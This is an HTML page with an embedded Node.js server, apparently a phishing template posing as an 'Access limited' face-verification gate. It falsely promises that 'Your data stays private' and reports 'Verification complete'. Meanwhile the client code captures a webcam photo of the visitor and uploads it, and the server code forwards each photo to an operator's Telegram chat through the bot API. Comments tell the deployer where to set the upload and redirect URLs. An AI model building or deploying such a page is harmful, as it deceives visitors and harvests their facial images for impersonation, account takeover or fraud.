<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Access Limited â€” Face Verification</title>
  <style>
    body{font-family:system-ui,Segoe UI,Arial,sans-serif;margin:0;background:#f4f6f8;color:#111;display:flex;align-items:center;justify-content:center;height:100vh}
    .card{width:420px;background:#fff;border-radius:10px;padding:24px;box-shadow:0 6px 20px rgba(16,24,40,.08);text-align:center}
    h1{margin:0 0 8px;font-size:20px}
    p{margin:0 0 16px;color:#444}
    button{padding:10px 14px;border-radius:8px;border:0;background:#0b76ef;color:#fff;font-weight:600;cursor:pointer}
    button[disabled]{opacity:.5;cursor:not-allowed}
    .small{font-size:13px;color:#666;margin-top:12px}

    /* modal */
    .modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.5)}
    .modal.show{display:flex}
    .modal-box{background:#fff;padding:18px;border-radius:10px;width:560px;max-width:96%;text-align:left}
    .row{display:flex;gap:8px;align-items:center}
    video{width:100%;border-radius:8px;background:#000}
    canvas{display:none}
    .controls{display:flex;gap:8px;margin-top:10px}
    .success-box{display:none;padding:16px;background:#e6ffed;border-radius:8px;color:#0a6b2a}
  </style>
</head>
<body>
  <div class="card">
    <h1>Access limited</h1>
    <p>We need facial verification to grant access. Your data stays private.</p>
    <div style="display:flex;gap:8px;justify-content:center">
      <button id="startBtn">Start verification</button>
      <button id="skipBtn">Contact support</button>
    </div>
    <div class="small">Note: camera permission required. Use a safe network.</div>
  </div>

  <div id="modal" class="modal" role="dialog" aria-modal="true">
    <div class="modal-box">
      <h2>Face verification</h2>
      <p>Position your face inside the camera view. Click capture when ready.</p>
      <video id="video" autoplay playsinline></video>
      <canvas id="canvas"></canvas>
      <div class="controls">
        <button id="captureBtn">Capture</button>
        <button id="retakeBtn" disabled>Retake</button>
        <button id="closeBtn">Close</button>
      </div>
      <div style="margin-top:12px;display:flex;gap:8px;align-items:center">
        <button id="sendBtn" disabled>Submit for verification</button>
        <div id="sending" style="display:none">Sending...</div>
      </div>
      <div class="success-box" id="successBox">Photo sent. Verification complete.</div>
    </div>
  </div>

  <script>
    const startBtn = document.getElementById('startBtn')
    const modal = document.getElementById('modal')
    const video = document.getElementById('video')
    const canvas = document.getElementById('canvas')
    const captureBtn = document.getElementById('captureBtn')
    const retakeBtn = document.getElementById('retakeBtn')
    const closeBtn = document.getElementById('closeBtn')
    const sendBtn = document.getElementById('sendBtn')
    const sendingIndicator = document.getElementById('sending')
    const successBox = document.getElementById('successBox')

    // change this to the URL where your server receives the image
    const UPLOAD_ENDPOINT = '/upload'

    let stream = null
    let capturedBlob = null

    async function openCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}, audio: false})
        video.srcObject = stream
        modal.classList.add('show')
        sendBtn.disabled = true
        retakeBtn.disabled = true
        successBox.style.display = 'none'
      } catch (err) {
        alert('Unable to access camera. Check permissions')
      }
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(t => t.stop())
        stream = null
      }
      video.srcObject = null
    }

    startBtn.addEventListener('click', () => openCamera())
    closeBtn.addEventListener('click', () => {
      stopCamera()
      modal.classList.remove('show')
    })

    captureBtn.addEventListener('click', () => {
      // draw video frame to canvas
      canvas.width = video.videoWidth || 640
      canvas.height = video.videoHeight || 480
      const ctx = canvas.getContext('2d')
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
      canvas.toBlob(blob => {
        capturedBlob = blob
        sendBtn.disabled = false
        retakeBtn.disabled = false
        // show a tiny preview by replacing video with the canvas image
        video.style.display = 'none'
        canvas.style.display = 'block'
        canvas.style.width = '100%'
      }, 'image/jpeg', 0.9)
    })

    retakeBtn.addEventListener('click', () => {
      capturedBlob = null
      sendBtn.disabled = true
      retakeBtn.disabled = true
      canvas.style.display = 'none'
      video.style.display = 'block'
    })

    sendBtn.addEventListener('click', async () => {
      if (!capturedBlob) return
      sendBtn.disabled = true
      sendingIndicator.style.display = 'inline-block'

      try {
        const form = new FormData()
        form.append('image', capturedBlob, 'face.jpg')

        // send to your server. server will forward to Telegram using secure token stored server-side
        const res = await fetch(UPLOAD_ENDPOINT, {method: 'POST', body: form})
        const data = await res.json()
        if (res.ok && data.ok) {
          successBox.style.display = 'block'
          // show final dialog with continue button
          showCompleteDialog(data)
        } else {
          alert('Upload failed')
          sendBtn.disabled = false
        }
      } catch (err) {
        console.error(err)
        alert('Network error')
        sendBtn.disabled = false
      } finally {
        sendingIndicator.style.display = 'none'
      }
    })

    function showCompleteDialog(data) {
      // simple flow. you can customize
      const cont = document.createElement('div')
      cont.style.marginTop = '12px'
      cont.innerHTML = '<div style="padding:12px;background:#fff;border-radius:8px;text-align:center">' +
        '<p>Verification sent. You may continue when verification completes.</p>' +
        '<button id="continueBtn">Continue to web app</button>' +
        '</div>'
      document.querySelector('.modal-box').appendChild(cont)
      document.getElementById('continueBtn').addEventListener('click', () => {
        // change to your redirect url
        const REDIRECT_URL = 'https://example.com/after-verification'
        window.location.href = REDIRECT_URL
      })
    }

    // cleanup on page unload
    window.addEventListener('beforeunload', () => stopCamera())
  </script>

  <!-- Server example below. Put this in a separate file on your server. Do not put BOT token in client code -->
  <!-- Node.js express server. Save as server.js -->
  <!--
  const express = require('express')
  const multer = require('multer')
  const fs = require('fs')
  const FormData = require('form-data')
  const axios = require('axios')
  require('dotenv').config()

  const upload = multer({ dest: 'uploads/' })
  const app = express()
  const PORT = process.env.PORT || 3000
  const BOT_TOKEN = process.env.BOT_TOKEN // set in .env
  const CHAT_ID = process.env.CHAT_ID     // set in .env

  app.post('/upload', upload.single('image'), async (req, res) => {
    if (!req.file) return res.status(400).json({ ok: false, error: 'no file' })

    try {
      const form = new FormData()
      form.append('chat_id', CHAT_ID)
      form.append('photo', fs.createReadStream(req.file.path))

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
      const response = await axios.post(url, form, { headers: form.getHeaders() })

      // remove temp file
      fs.unlink(req.file.path, () => {})

      if (response.data && response.data.ok) {
        return res.json({ ok: true, data: response.data })
      }

      return res.status(500).json({ ok: false, error: 'telegram error', info: response.data })
    } catch (err) {
      fs.unlink(req.file.path, () => {})
      console.error(err)
      return res.status(500).json({ ok: false, error: 'server error' })
    }
  })

  app.use(express.static('public'))
  app.listen(PORT, () => console.log('server started', PORT))
  -->
</body>
</html>
